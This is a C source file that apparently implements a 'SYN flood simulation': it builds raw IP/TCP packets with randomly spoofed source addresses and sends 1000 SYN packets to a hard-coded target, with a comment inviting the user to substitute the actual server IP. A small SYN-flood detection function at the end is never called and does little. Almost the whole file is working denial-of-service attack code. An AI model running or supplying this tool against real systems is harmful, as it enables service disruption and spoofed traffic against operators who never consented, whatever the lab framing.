#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define PACKET_SIZE 4096
#define SYN_FLOOD_PACKETS 1000 // Number of packets to simulate a SYN flood
#define SYN_THRESHOLD 50 // Threshold for detecting SYN flood attacks

void perform_syn_flood(const char *target_ip, int target_port);
unsigned short compute_checksum(unsigned short *ptr, int nbytes);
unsigned short compute_tcp_checksum(struct iphdr *ip_header, struct tcphdr *tcp_header);

int main() {
    const char *target_server_ip = "172.17.0.2"; // Replace with the actual server IP
    int target_server_port = 80; // Replace with the actual server port

    printf("Starting SYN flood simulation on %s:%d...\n", target_server_ip, target_server_port);
    perform_syn_flood(target_server_ip, target_server_port);

    return 0;
}

void perform_syn_flood(const char *target_ip, int target_port) {
    int raw_socket;
    char packet_buffer[PACKET_SIZE];
    struct iphdr *ip_header = (struct iphdr *)packet_buffer;
    struct tcphdr *tcp_header = (struct tcphdr *)(packet_buffer + sizeof(struct iphdr));
    struct sockaddr_in destination;

    // Create raw socket
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_socket < 0) {
        perror("Failed to create raw socket");
        exit(EXIT_FAILURE);
    }

    // Set destination details
    destination.sin_family = AF_INET;
    destination.sin_port = htons(target_port);
    destination.sin_addr.s_addr = inet_addr(target_ip);

    srand(time(NULL)); // Seed for random number generation

    // Loop to send SYN packets
    for (int i = 0; i < SYN_FLOOD_PACKETS; i++) {
        // Clear the buffer
        memset(packet_buffer, 0, PACKET_SIZE);

        // Fill in IP header
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = htonl((rand() % 255) << 24 | (rand() % 255) << 16 | (rand() % 255) << 8 | (rand() % 255));
        ip_header->daddr = inet_addr(target_ip);

        // Fill in TCP header
        tcp_header->source = htons(rand() % 65535);
        tcp_header->dest = htons(target_port);
        tcp_header->seq = htonl(rand());
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->ack = 0;
        tcp_header->psh = 0;
        tcp_header->rst = 0;
        tcp_header->fin = 0;
        tcp_header->urg = 0;

        // Calculate checksum
        tcp_header->check = 0;
        tcp_header->check = compute_tcp_checksum(ip_header, tcp_header);

        // Send packet
        if (sendto(raw_socket, packet_buffer, ntohs(ip_header->tot_len), 0, (struct sockaddr *)&destination, sizeof(destination)) < 0) {
            perror("Error sending SYN packet");
            close(raw_socket);
            exit(EXIT_FAILURE);
        }

        printf("Sent SYN packet %d to %s:%d\n", i + 1, target_ip, target_port);
    }

    close(raw_socket);
}

unsigned short compute_tcp_checksum(struct iphdr *ip_header, struct tcphdr *tcp_header) {
    unsigned char pseudo_packet[PACKET_SIZE];
    int tcp_length = ntohs(ip_header->tot_len) - sizeof(struct iphdr);

    struct pseudo_header {
        unsigned int src_addr;
        unsigned int dest_addr;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
    } pseudo;

    // Populate pseudo-header
    pseudo.src_addr = ip_header->saddr;
    pseudo.dest_addr = ip_header->daddr;
    pseudo.placeholder = 0;
    pseudo.protocol = IPPROTO_TCP;
    pseudo.tcp_length = htons(tcp_length);

    // Copy pseudo-header and TCP header into a buffer
    memcpy(pseudo_packet, &pseudo, sizeof(struct pseudo_header));
    memcpy(pseudo_packet + sizeof(struct pseudo_header), tcp_header, tcp_length);

    // Compute checksum
    return compute_checksum((unsigned short *)pseudo_packet, sizeof(struct pseudo_header) + tcp_length);
}

unsigned short compute_checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum;
    for (sum = 0; nbytes > 1; nbytes -= 2) {
        sum += *ptr++;
    }
    if (nbytes == 1) {
        sum += *(unsigned char *)ptr;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// New function to detect SYN flood in server
void detect_syn_flood(unsigned long source_ip, int syn_count) {
    if (syn_count > SYN_THRESHOLD) {
        printf("SYN flood attack detected from IP: %lu\n", source_ip);
    }
}